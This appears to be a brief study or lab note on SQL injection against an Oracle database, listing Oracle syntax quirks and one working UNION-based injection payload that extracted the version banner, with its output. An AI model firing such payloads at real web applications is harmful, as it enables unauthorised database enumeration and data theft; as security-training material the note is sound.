## SQLi - Oracle database enumeration

Oracle quirks vs other databases:
- FROM dual required on every SELECT (no bare SELECT NULL)
- v$version table contains version info (BANNER column)
- all_tables / all_columns instead of information_schema

payload that worked:
' UNION SELECT BANNER,NULL FROM v$version--

result: Oracle Database 11g Express Edition Release 11.2.0.2.0
